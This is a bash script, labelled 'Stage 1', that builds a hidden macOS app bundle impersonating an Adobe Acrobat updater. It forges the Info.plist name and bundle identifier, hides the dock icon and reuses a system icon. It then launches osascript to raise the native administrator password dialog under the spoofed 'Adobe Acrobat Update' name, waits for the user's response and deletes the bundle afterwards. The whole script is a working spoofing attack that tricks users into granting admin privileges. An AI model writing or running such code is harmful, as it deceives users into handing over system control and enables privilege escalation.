#!/bin/bash
# Stage 1: Create fake Adobe app bundle with proper CFBundleName
APP_DIR="/tmp/.AdobeAcrobatUpdate.app"
rm -rf "$APP_DIR"
mkdir -p "$APP_DIR/Contents/MacOS"
mkdir -p "$APP_DIR/Contents/Resources"

# Info.plist — this controls what name appears in the auth dialog
cat > "$APP_DIR/Contents/Info.plist" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>Adobe Acrobat Update</string>
    <key>CFBundleDisplayName</key>
    <string>Adobe Acrobat Update</string>
    <key>CFBundleIdentifier</key>
    <string>com.adobe.acrobat.update</string>
    <key>CFBundleExecutable</key>
    <string>updater</string>
    <key>CFBundleVersion</key>
    <string>26.001.20063</string>
    <key>CFBundleIconFile</key>
    <string>AppIcon</string>
    <key>LSUIElement</key>
    <true/>
</dict>
</plist>
PLIST

# Copy a system icon for the app
cp /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/ToolbarAdvanced.icns "$APP_DIR/Contents/Resources/AppIcon.icns" 2>/dev/null

# The actual executable — triggers the native macOS admin auth dialog
# The dialog will say "Adobe Acrobat Update wants to make changes"
cat > "$APP_DIR/Contents/MacOS/updater" << 'UPDATER'
#!/bin/bash
RESULT=$(osascript -e 'do shell script "echo AUTHED" with administrator privileges' 2>&1)
echo "$RESULT" > /tmp/.adobe_update_result
UPDATER
chmod +x "$APP_DIR/Contents/MacOS/updater"

# Launch the fake app
open "$APP_DIR"

# Wait for result (user interaction)
for i in $(seq 1 60); do
    if [ -f /tmp/.adobe_update_result ]; then
        cat /tmp/.adobe_update_result
        rm -f /tmp/.adobe_update_result
        break
    fi
    sleep 1
done

# Cleanup
rm -rf "$APP_DIR"
